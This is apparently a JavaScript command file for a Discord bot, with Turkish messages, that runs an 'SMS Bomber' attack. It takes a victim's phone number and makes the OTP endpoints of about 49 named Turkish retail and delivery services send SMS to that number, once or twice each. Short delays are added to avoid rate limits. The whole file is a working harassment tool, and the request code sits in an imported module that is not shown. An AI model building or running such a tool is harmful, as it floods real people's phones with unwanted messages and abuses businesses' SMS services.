const { Client, CommandInteraction, MessageEmbed } = require("discord.js");
const { createDatabase } = require("whisky.db");
const db = new createDatabase();
const ms = require("parse-ms");
const { SmsBomber } = require("../../whiskylorean/sms.js");

module.exports = {
    name: "sms-bomber",
    description: "Hedef numaraya SMS Bomber saldırısı başlatır.",
    type: 'CHAT_INPUT',
    options: [
        {
            name: 'numara',
            description: '10 haneli telefon numarası (Örn: 5551234567)',
            type: 'STRING',
            required: true,
            minLength: 10,
            maxLength: 10
        },
        {
            name: 'mod',
            description: 'Gönderim modu seçin.',
            type: 'STRING',
            required: true,
            choices: [
                {
                    name: 'Tekli (Tüm servisler birer kez gönderir)',
                    value: 'tekli'
                },
                {
                    name: 'Çift (Tüm servisler ikişer kez gönderir)',
                    value: 'cift'
                }
            ]
        }
    ],
    /**
     * @param {Client} client
     * @param {CommandInteraction} interaction
     * @param {String[]} args
     */
    run: async (client, interaction, args) => {
        const config = client.config;

        // Rol kontrolü
        if (!interaction.member || !interaction.member.roles.cache.has(config.gerekliRolId)) {
            return interaction.reply({
                embeds: [
                    new MessageEmbed()
                        .setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true }))
                        .setDescription("Bu komutu kullanmak için gerekli role sahip değilsin!")
                        .setColor("RED")
                ],
                ephemeral: true
            });
        }

        const tel = interaction.options.getString('numara');
        const gonderim = interaction.options.getString('mod');

        const regex = /^[5][0-9]{9}$/;
        const timeout = 60000; // 60 saniye bekleme süresi

        const beklelan = db.get(`smscool_${interaction.user.id}`);
        if (beklelan !== null && timeout - (Date.now() - beklelan) > 0) {
            const timeLeft = ms(timeout - (Date.now() - beklelan));
            return interaction.reply({
                embeds: [
                    new MessageEmbed()
                        .setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true }))
                        .setDescription(`Bu komutu tekrar kullanmak için **${timeLeft.seconds}** saniye bekle!`)
                        .setColor("RED")
                ],
                ephemeral: true
            });
        }

        if (!regex.test(tel)) {
            return interaction.reply({
                embeds: [
                    new MessageEmbed()
                        .setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true }))
                        .setDescription("Geçersiz telefon numarası! Numarayı 10 haneli ve 5 ile başlayacak şekilde girin. Örnek: 5551234567")
                        .setColor("RED")
                ],
                ephemeral: true
            });
        }

        // Defer reply for long-running task
        await interaction.deferReply({ ephemeral: true });

        // Edit reply to show the attack is starting
        await interaction.editReply({
            embeds: [
                new MessageEmbed()
                    .setAuthor("Başlatılıyor...", interaction.user.displayAvatarURL({ dynamic: true }))
                    .setDescription(`✅ SMS Bomber saldırısı başlatılıyor! \n\n📱 **Hedef Numara:** ||**${tel}**|| \n🎯 **Gönderim Modu:** ${gonderim === 'tekli' ? "Tekli Gönderim" : "Çift Gönderim"}`)
                    .setColor("GREEN")
            ]
        });

        // Log channel message
        if (config.log && config.logKanalId) {
            const logChannel = client.channels.cache.get(config.logKanalId);
            if (logChannel) {
                logChannel.send(`<@${interaction.user.id}> - **${interaction.user.tag}** (**${interaction.user.id}**) adlı kullanıcı SMS Bomber komutunu kullandı.\n**Numara:** ||${tel}||\n**Gönderim Modu:** ${gonderim === 'tekli' ? "Tekli Gönderim" : "Çift Gönderim"}`);
            }
        }

        db.set(`smscool_${interaction.user.id}`, Date.now());

        const sms = new SmsBomber(tel, interaction, gonderim);

        const services = ['kahveDunyasi', 'wmf', 'bim', 'englishHome', 'icq', 'suIste', 'kimGb', 'tazi', 'hey', 'biSu', 'ucDortBes', 'macro', 'tiklaGelsin', 'altinYildiz', 'naosStars', 'isteGelsin', 'hayatSu', 'evIdea', 'koton', 'hizliEcza', 'metro', 'qumpara', 'ipragaz', 'migros', 'paybol', 'fileMarket', 'joker', 'akasya', 'akbati', 'clickMe', 'happy', 'komagene', 'kuryemGelsin', 'porty', 'taksim', 'tasdelen', 'tasimacim', 'uysal', 'yapp', 'yilmazTicaret', 'yuffi', 'starbucks', 'pidem', 'baydoner', 'frink', 'bodrum', 'dominos', 'hoplaGit', 'n11'];

        const runAttack = async () => {
            try {
                const attackPromises = [];
                const loopCount = gonderim === 'cift' ? 2 : 1;

                for (let i = 0; i < loopCount; i++) {
                    for (const service of services) {
                        // Başlatılan her servis çağrısını promise olarak ekle
                        // Eğer sms[service] bir async fonksiyon ise parantezlerle çağırıyoruz
                        if (typeof sms[service] === 'function') {
                            attackPromises.push(sms[service]());
                        }
                        // Servisler arası bekleme süresi ekleyerek rate-limit yeme olasılığını azalt
                        await new Promise(resolve => setTimeout(resolve, 150));
                    }
                }

                await Promise.all(attackPromises);

                // Saldırı bitince mesajı güncelle
                await interaction.editReply({ content: "✅ Saldırı tamamlandı.", embeds: [] });
            } catch (err) {
                console.error("runAttack error:", err);
                // Hata durumunda kullanıcıya bilgi ver
                try {
                    await interaction.editReply({
                        embeds: [
                            new MessageEmbed()
                                .setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true }))
                                .setDescription("Saldırı sırasında bir hata oluştu. Lütfen daha sonra tekrar deneyin.")
                                .setColor("RED")
                        ]
                    });
                } catch (e) {
                    console.error("editReply error:", e);
                }
            }
        };

        runAttack().catch(err => console.error("runAttack outer catch:", err));
    },
};
